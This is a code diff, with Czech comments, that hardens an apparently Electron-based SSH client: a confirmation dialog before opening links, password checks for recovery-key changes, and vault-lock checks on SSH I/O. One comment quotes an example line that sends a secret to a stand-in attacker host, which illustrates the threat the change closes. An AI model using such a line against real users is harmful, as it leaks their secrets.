@@ -25,7 +25,7 @@ import type {
   VaultStatus
 } from '../shared/types'
 import type { CommandApproval, McpStatus, ShareRequest } from '../shared/types'
-import { appError, currentLocale, initI18n, setLocale } from './i18n'
+import { appError, currentLocale, initI18n, setLocale, t } from './i18n'
 import { readPrefs, writePrefs } from './prefs'
 import { DEFAULT_SETTINGS, migrateLegacyProfile, newId, vault } from './vault'
 import { ssh } from './ssh'
@@ -59,8 +59,36 @@ function createWindow(): void {
   mainWindow.once('ready-to-show', () => mainWindow?.show())
 
   // Externí odkazy do systémového prohlížeče, nikdy do okna aplikace.
+  //
+  // Schéma se kontroluje kotveným výrazem, takže `file:`, `javascript:` ani SMB
+  // cesty neprojdou. To ale nestačí: `shell.openExternal` neřídí CSP, takže
+  // `window.open('https://utocnik/?d=' + tajemstvi)` byl použitelný jako
+  // exfiltrační kanál — a odkazy v terminálovém výstupu jsou klikatelné, takže
+  // ten výstup nemusí pocházet od uživatele.
+  //
+  // Proto se uživatel zeptá. Dialog ukazuje **celou** adresu, ne zkrácenou:
+  // zkrácení je přesně to, čím se exfiltrační URL schová.
   mainWindow.webContents.setWindowOpenHandler(({ url }) => {
-    if (/^https?:\/\//.test(url)) void shell.openExternal(url)
+    if (!/^https?:\/\//.test(url)) return { action: 'deny' }
+
+    const win = mainWindow
+    if (!win) return { action: 'deny' }
+
+    void dialog
+      .showMessageBox(win, {
+        type: 'question',
+        buttons: [t('common.cancel'), t('link.open')],
+        defaultId: 0,
+        cancelId: 0,
+        title: t('link.confirmTitle'),
+        message: t('link.confirmBody'),
+        detail: url,
+        noLink: true
+      })
+      .then(({ response }) => {
+        if (response === 1) void shell.openExternal(url)
+      })
+
     return { action: 'deny' }
   })
   mainWindow.webContents.on('will-navigate', (event, url) => {
@@ -303,11 +331,13 @@ function registerIpc(): void {
     return null
   })
 
+  // Vrací nový obnovovací klíč — obnova rotuje datový klíč, takže ten použitý
+  // přestal platit. UI ho musí zobrazit, jinak uživatel zůstane bez záchrany.
   handle(CH.vaultUnlockWithRecovery, async (recoveryKey: string, newPassword: string) => {
-    await vault.unlockWithRecovery(recoveryKey, newPassword)
+    const fresh = await vault.unlockWithRecovery(recoveryKey, newPassword)
     resetAutoLock()
     await syncMcp()
-    return null
+    return fresh
   })
 
   handle(CH.vaultLock, () => {
@@ -315,15 +345,21 @@ function registerIpc(): void {
     return null
   })
 
-  handle(CH.vaultChangePassword, async (oldPw: string, newPw: string) => {
-    await vault.changePassword(oldPw, newPw)
-    return null
-  })
+  // Vrací nový obnovovací klíč, pokud trezor nějaký měl. Změna hesla rotuje
+  // datový klíč a starý obnovovací wrap pod nový DEK postavit nejde — klíč se
+  // nikde neukládá. UI ho musí zobrazit.
+  handle(CH.vaultChangePassword, (oldPw: string, newPw: string) =>
+    vault.changePassword(oldPw, newPw)
+  )
 
-  handle(CH.vaultRegenerateRecovery, () => vault.regenerateRecoveryKey())
+  // Heslo je povinné: rotace DEK ho potřebuje, a bez něj stačila odemčená
+  // relace na vydání klíče, který trezor otevírá navždy.
+  handle(CH.vaultRegenerateRecovery, (password: string) =>
+    vault.regenerateRecoveryKey(password)
+  )
 
-  handle(CH.vaultRemoveRecovery, async () => {
-    await vault.removeRecoveryKey()
+  handle(CH.vaultRemoveRecovery, async (password: string) => {
+    await vault.removeRecoveryKey(password)
     return null
   })
 
@@ -500,12 +536,23 @@ function registerIpc(): void {
   })
 
   /* SSH */
-  handle(CH.sshConnect, (connectionId: string) => ssh.connect(connectionId))
+  //
+  // Každá cesta k SSH I/O prochází `requireUnlocked()`. Zamčení trezoru dřív
+  // nebylo hranicí: renderer sice smazal seznam záložek, ale hlavní proces
+  // relace držel dál a `write`/`resize` nikdo nehlídal — takže zamčená
+  // aplikace pořád uměla psát do vzdáleného shellu. Zámek buď znamená konec
+  // přístupu, nebo neznamená nic.
+  handle(CH.sshConnect, (connectionId: string) => {
+    vault.requireUnlockedPublic()
+    return ssh.connect(connectionId)
+  })
   handle(CH.sshWrite, (sessionId: string, data: string) => {
+    vault.requireUnlockedPublic()
     ssh.write(sessionId, data)
     return null
   })
   handle(CH.sshResize, (sessionId: string, cols: number, rows: number) => {
+    vault.requireUnlockedPublic()
     ssh.resize(sessionId, cols, rows)
     return null
   })
